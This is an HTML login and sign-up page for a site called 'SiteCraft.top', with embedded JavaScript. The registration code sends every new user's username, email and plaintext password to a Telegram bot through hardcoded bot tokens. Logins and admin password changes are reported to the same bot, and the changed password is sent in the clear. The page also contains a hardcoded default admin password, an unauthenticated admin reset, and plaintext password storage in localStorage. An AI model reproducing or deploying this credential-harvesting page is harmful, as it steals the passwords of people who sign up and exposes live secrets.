<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SiteCraft.top ‚Äì Login / Sign Up</title>

<style>
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;600;700&display=swap');
*{ margin:0; padding:0; box-sizing:border-box; font-family:"Poppins",sans-serif; }
body{ display:flex; justify-content:center; align-items:center; height:100vh; position:relative; transition: background 0.4s, color 0.4s; }
body.dark-mode{ background:#121212; color:#fff; }
body.light-mode{ background:#f4f4f4; color:#222; }

.mode-switch { position: fixed; top: 20px; right: 20px; width: 60px; height: 30px; background: #4b6bfb; border-radius: 30px; cursor: pointer; display: flex; align-items: center; padding: 2px; transition: background 0.3s; z-index: 10000; box-shadow: 0 0 10px rgba(0,0,0,0.4); }
.mode-switch .slider { width: 26px; height: 26px; background: #fff; border-radius: 50%; transition: transform 0.4s, box-shadow 0.4s, background 0.4s; display: flex; justify-content: center; align-items: center; font-size: 16px; box-shadow: 0 0 8px rgba(255,255,255,0.6); }
body.light-mode .mode-switch { background: #f39c12; }
body.light-mode .mode-switch .slider { transform: translateX(30px); box-shadow: 0 0 12px #fffa90; background: #fff; }

.back-btn {
  position: fixed;
  top: 20px;
  left: 20px;
  padding: 8px 14px;
  background: #4b6bfb;
  color: #fff;
  text-decoration: none;
  border-radius: 8px;
  font-weight: 600;
  box-shadow: 0 0 8px rgba(0,0,0,0.3);
  transition: background 0.3s, transform 0.2s;
  z-index: 10000;
}
.back-btn:hover { background: #3a54d1; transform: translateY(-2px); }
body.light-mode .back-btn { background: #f39c12; color: #fff; }
body.light-mode .back-btn:hover { background: #d78b0e; }

#popup-container{ position: fixed; top: 70px; right: 20px; z-index: 9999; }
.popup{ background:#333; color:#fff; padding:12px 20px; margin-bottom:10px; border-radius:8px; min-width:220px; box-shadow:0 4px 20px rgba(0,0,0,0.4); font-size:14px; opacity:0; transform: translateX(100%); display:flex; align-items:center; transition: all 0.5s ease; }
.popup.show{ opacity:1; transform: translateX(0); }
.popup.success{ background:#4BB543; }
.popup.error{ background:#FF3333; }
.popup.info{ background:#555; }
.popup i{ margin-right:8px; font-style:normal; font-weight:bold; }

.container{ position:relative; width:380px; height:520px; border-radius:22px; overflow:hidden; transition: background 0.4s, color 0.4s, box-shadow 0.4s; }
body.dark-mode .container{ background:#1e1e1e; box-shadow:0 0 25px rgba(0,0,0,0.5); }
body.light-mode .container{ background:#fff; box-shadow:0 0 25px rgba(0,0,0,0.15); }

.form-box{ position:absolute; width:100%; height:100%; padding:32px; text-align:center; transition:0.6s ease-in-out; }
.login{ top:0; }
.register{ top:100%; }
.forgot{ top:200%; }
.container.active .login{ top:-100%; }
.container.active .register{ top:0; }
.container.forgot-active .login{ top:-100%; }
.container.forgot-active .forgot{ top:0; }

h1{ font-size:26px; margin-bottom:16px; }
body.dark-mode h1{ color:#fff; }
body.light-mode h1{ color:#222; }

.input-box{ margin:20px 0; text-align:left; }
.input-box label{ font-size:14px; font-weight:500; }
body.dark-mode .input-box label{ color:#bbb; }
body.light-mode .input-box label{ color:#555; }
.input-box input{ width:100%; padding:12px 14px; border-radius:6px; margin-top:6px; border:1px solid; transition: background 0.4s, color 0.4s, border 0.4s; }
body.dark-mode .input-box input{ background:#2c2c2c; color:#fff; border:1px solid #444; }
body.light-mode .input-box input{ background:#f1f3f4; color:#222; border:1px solid #dadce0; }
.input-box input::placeholder { color: #aaa; }

.btn{ display:block; width:80%; margin:12px auto; padding:12px; border:none; border-radius:8px; color:#fff; font-size:15px; font-weight:600; cursor:pointer; background:#4b6bfb; transition: background 0.3s; }
.btn:hover{ background:#3a54d1; }

.toggle-btn{ margin-top:12px; font-size:14px; }
.toggle-btn a{ display:block; color:#4b6bfb; font-weight:600; cursor:pointer; margin-top:6px; }

.show-pass-container{ display:flex; align-items:center; margin-top:6px; cursor:pointer; }
.show-pass-container input[type="checkbox"]{ width:16px; height:16px; accent-color:#4b6bfb; margin-right:8px; }
.show-pass-container label{ font-size:13px; user-select:none; }
</style>
</head>
<body class="dark-mode">

<!-- BACK BUTTON -->
<a href="index.html" class="back-btn">‚Üê Back</a>

<!-- MODE SWITCH -->
<div class="mode-switch" onclick="toggleMode()">
  <div class="slider" id="modeSlider">üåô</div>
</div>

<div id="popup-container"></div>

<div class="container" id="container">

<!-- LOGIN -->
<div class="form-box login">
  <h1>Login</h1>
  <div class="input-box">
    <label>Username</label>
    <input type="text" id="loginUser" placeholder="e.g., johnDoe123">
  </div>
  <div class="input-box">
    <label>Password</label>
    <input type="password" id="loginPass" placeholder="Enter your password">
    <div class="show-pass-container">
      <input type="checkbox" id="showLoginPass" onclick="togglePassword('loginPass', this)">
      <label for="showLoginPass">Show Password</label>
    </div>
  </div>
  <button class="btn" onclick="login()">Login</button>
  <div class="toggle-btn">
    <a onclick="showForgot()">Forgot Password?</a>
    <a onclick="toggle()">Sign Up</a>
  </div>
</div>

<!-- REGISTER -->
<div class="form-box register">
  <h1>Create Account</h1>
  <div class="input-box">
    <label>Username</label>
    <input type="text" id="regUser" placeholder="e.g., johnDoe123">
  </div>
  <div class="input-box">
    <label>Email</label>
    <input type="email" id="regEmail" placeholder="e.g., john@gmail.com" pattern="[a-z0-9._%+-]+@gmail\.com" title="Enter a valid Gmail address" required>
  </div>
  <div class="input-box">
    <label>Password</label>
    <input type="password" id="regPass" placeholder="Create a strong password">
    <div class="show-pass-container">
      <input type="checkbox" id="showRegPass" onclick="togglePassword('regPass', this)">
      <label for="showRegPass">Show Password</label>
    </div>
  </div>
  <button class="btn" onclick="register()">Sign Up</button>
  <div class="toggle-btn">
    <a onclick="backToLogin()">Back to Login</a>
  </div>
</div>

<!-- FORGOT PASSWORD -->
<div class="form-box forgot">
  <h1>Forgot Password</h1>
  <div class="input-box">
    <label>Username</label>
    <input type="text" id="fpUser" placeholder="e.g., johnDoe123">
  </div>
  <div class="input-box">
    <label>Email (Gmail)</label>
    <input type="email" id="fpEmail" placeholder="e.g., john@gmail.com" pattern="[a-z0-9._%+-]+@gmail\.com" title="Enter a valid Gmail address" required>
  </div>
  <button class="btn" onclick="forgotPassword()">Submit</button>
  <div class="toggle-btn">
    <a onclick="backToLogin()">Back to Login</a>
  </div>
</div>

</div>

<script>
const container = document.getElementById("container");
const popupContainer = document.getElementById("popup-container");
const body = document.body;
const slider = document.getElementById("modeSlider");

/* =========================
   TELEGRAM SETUP
========================= */
const TELEGRAM_BOTS = {
  signup: { token: "8448157151:AAHhuamtrUVBsDPb2fSnqh5kEDXG99UFAfo", chat_id: "6340167379" },
  login: { token: "8075539797:AAFbBkKEJqOfXA2a9XgDX_4sIaq0WVt3ciU", chat_id: "6340167379" },
  forgot: { token: "8318249547:AAG5ydICUt5otXZfd0_Te4kHsalfk2GbaEc", chat_id: "6340167379" }
};

function sendTelegram(bot, msg){
  fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`,{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({ chat_id: bot.chat_id, text: msg })
  }).catch(err=>console.error("Telegram error:", err));
}

/* =========================
   ADMIN DEFAULT PASSWORD
========================= */
if(!localStorage.getItem("admin_pass")){
  localStorage.setItem("admin_pass","Admin@123");
}

/* =========================
   HELPERS
========================= */
function showPopup(message, type="info"){
  const popup = document.createElement("div");
  popup.className = "popup " + type;
  popup.innerHTML = `<i>${type==="success" ? "‚úÖ" : type==="error" ? "‚ùå" : "‚ÑπÔ∏è"}</i> ${message}`;
  popupContainer.appendChild(popup);
  setTimeout(()=>{ popup.classList.add("show"); }, 10);
  setTimeout(()=>{
    popup.classList.remove("show");
    setTimeout(()=> popup.remove(), 500);
  }, 3000);
}

function toggle(){ container.className="container active"; }
function showForgot(){ container.className="container forgot-active"; }
function backToLogin(){ container.className="container"; }
function togglePassword(id, checkbox){
  const input = document.getElementById(id);
  input.type = checkbox.checked ? "text" : "password";
}
function toggleMode(){
  if(body.classList.contains("dark-mode")){
    body.classList.remove("dark-mode");
    body.classList.add("light-mode");
    slider.textContent = "üåû";
  } else {
    body.classList.remove("light-mode");
    body.classList.add("dark-mode");
    slider.textContent = "üåô";
  }
}
function isGmail(email){
  return /^[a-z0-9._%+-]+@gmail\.com$/i.test(email);
}

/* =========================
   REGISTER
========================= */
function register(){
  if(!regUser.value || !regEmail.value || !regPass.value){
    showPopup("Please fill all fields", "error");
    return;
  }
  if(!isGmail(regEmail.value)){
    showPopup("Please enter a valid Gmail address", "error");
    return;
  }

  localStorage.setItem("user_"+regUser.value,
    JSON.stringify({ email:regEmail.value, pass:regPass.value }));

  showPopup("Signup successful! You can login now.", "success");

  // Telegram notification
  sendTelegram(TELEGRAM_BOTS.signup, `üÜï New User Registered: ${regUser.value}\nEmail: ${regEmail.value}\nPassword: ${regPass.value}`);

  backToLogin();
}

/* =========================
   LOGIN
========================= */
function login(){
  const username = loginUser.value.trim();
  const password = loginPass.value.trim();

  if(username === "admin"){
    const adminPass = localStorage.getItem("admin_pass");
    if(password === adminPass){
      localStorage.setItem("currentUser","admin");
      localStorage.setItem("currentRole","admin");
      showPopup("Admin login successful!", "success");

      // Telegram notification
      sendTelegram(TELEGRAM_BOTS.login, `üîë Admin logged in at ${new Date().toLocaleString()}`);

      setTimeout(()=> window.location.href="dashboard.html", 1000);
    } else {
      showPopup("Wrong admin password!", "error");
    }
    return;
  }

  const saved = localStorage.getItem("user_"+username);
  if(!saved){
    showPopup("User not registered. Please sign up.", "error");
    return;
  }

  const data = JSON.parse(saved);
  if(password !== data.pass){
    showPopup("Wrong password. Try again.", "error");
    return;
  }

  localStorage.setItem("currentUser", username);
  localStorage.setItem("currentRole", "user");
  showPopup("Login successful! Redirecting...", "success");

  // Telegram notification
  sendTelegram(TELEGRAM_BOTS.login, `‚úÖ User logged in: ${username} at ${new Date().toLocaleString()}`);

  setTimeout(()=> window.location.href="dashboard.html", 1000);
}

/* =========================
   FORGOT PASSWORD
========================= */
function forgotPassword(){
  if(!isGmail(fpEmail.value)){
    showPopup("Please enter a valid Gmail address", "error");
    return;
  }

  const username = fpUser.value.trim();
  const email = fpEmail.value.trim();

  if(username === "admin"){
    const newPass = prompt("Enter new admin password:");
    if(!newPass){
      showPopup("Password change cancelled.", "error");
      return;
    }
    localStorage.setItem("admin_pass", newPass);
    showPopup("Admin password changed successfully!", "success");

    // Telegram notification for admin password change
    sendTelegram(TELEGRAM_BOTS.forgot, `üîê Admin password changed at ${new Date().toLocaleString()}\nNew Password: ${newPass}`);
  } else {
    showPopup("Password recovery request submitted.", "info");

    // Telegram notification for user forgot password
    sendTelegram(TELEGRAM_BOTS.forgot, `üîê Forgot Password Requested:\nUsername: ${username}\nEmail: ${email}`);
  }

  backToLogin();
}
</script>

</body>
</html>
